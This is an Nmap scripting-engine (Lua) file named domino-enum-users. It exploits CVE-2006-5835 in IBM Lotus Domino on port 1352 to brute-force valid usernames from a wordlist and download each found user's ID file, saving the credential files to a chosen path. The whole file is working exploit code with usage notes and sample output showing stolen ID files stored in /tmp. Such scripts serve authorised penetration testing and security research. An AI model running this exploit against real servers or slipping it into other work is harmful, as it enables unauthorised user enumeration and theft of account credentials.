local io = require "io"
local nrpc = require "nrpc"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"
local unpwdb = require "unpwdb"

description = [[
Attempts to discover valid IBM Lotus Domino users and download their ID files by exploiting the CVE-2006-5835 vulnerability.
]]

---
-- @usage
-- nmap --script domino-enum-users -p 1352 <host>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 1352/tcp open  lotusnotes
-- | domino-enum-users:
-- |   User "Patrik Karlsson" found, but not ID file could be downloaded
-- |   Successfully stored "FFlintstone" in /tmp/FFlintstone.id
-- |_  Successfully stored "MJacksson" in /tmp/MJacksson.id
--
--
-- @args domino-enum-users.path the location to which any retrieved ID files are stored
-- @args domino-enum-users.username the name of the user from which to retrieve the ID.
--                          If this parameter is not specified, the unpwdb
--                          library will be used to brute force names of users.
--
-- For more information see:
-- http://www-01.ibm.com/support/docview.wss?rs=463&uid=swg21248026
--
-- Credits
-- -------
-- o Ollie Whitehouse for bringing this to my attention back in the days when
--   it was first discovered and for the c-code on which this is based.

--
-- Version 0.1
-- Created 07/12/2010 - v0.1 - created by Patrik Karlsson <patrik@cqure.net>
--

author = "Patrik Karlsson"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "auth"}


portrule = shortport.port_or_service(1352, "lotusnotes", "tcp", "open")

--- Saves the ID file to disk
--
-- @param filename string containing the name and full path to the file
-- @param data contains the data
-- @return status true on success, false on failure
-- @return err string containing error message if status is false
local function saveIDFile( filename, data )
  local f = io.open( filename, "w")
  if ( not(f) ) then
    return false, ("Failed to open file (%s)"):format(filename)
  end
  if ( not(f:write( data ) ) ) then
    return false, ("Failed to write file (%s)"):format(filename)
  end
  f:close()

  return true
end

action = function(host, port)

  local helper = nrpc.Helper:new( host, port )
  local status, data, usernames, err
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path")
  local result = {}
  local save_file = false
  local counter = 0
  local domino_username = stdnse.get_script_args(SCRIPT_NAME .. ".username")
  if ( domino_username ) then
    usernames = ( function()
      local b = true
      return function()
        if ( b ) then
          b=false;
          return domino_username
        end
      end
    end )()
  else
    status, usernames = unpwdb.usernames()
    if ( not(status) ) then
      return false, "Failed to load usernames"
    end
  end

  for username in usernames do
    status = helper:connect()
    if ( not(status) ) then
      err = ("ERROR: Failed to connect to Lotus Domino Server %s"):format( host.ip )
      break
    end

    status, data = helper:isValidUser( username )
    helper:disconnect()

    if ( status and data and path ) then
      local filename = path .. "/" .. stdnse.filename_escape(username .. ".id")
      local status, err = saveIDFile( filename, data )

      if ( status ) then
        table.insert(result, ("Successfully stored \"%s\" in %s"):format(username, filename) )
      else
        stdnse.debug1("%s", err)
        table.insert(result, ("Failed to store \"%s\" to %s"):format(username, filename) )
      end
    elseif( status and data ) then
      table.insert(result, ("Successfully retrieved ID for \"%s\" (to store set the domino-enum-users.path argument)"):format(username) )
    elseif ( status ) then
      table.insert(result, ("User \"%s\" found, but no ID file could be downloaded"):format(username) )
    end

    counter = counter + 1
  end

  if ( #result == 0 ) then
    table.insert(result, ("Guessed %d usernames, none were found"):format(counter) )
  end

  result = stdnse.format_output( true, result )
  if ( err ) then
    result = result .. ("  \n  %s"):format(err)
  end

  return result
end
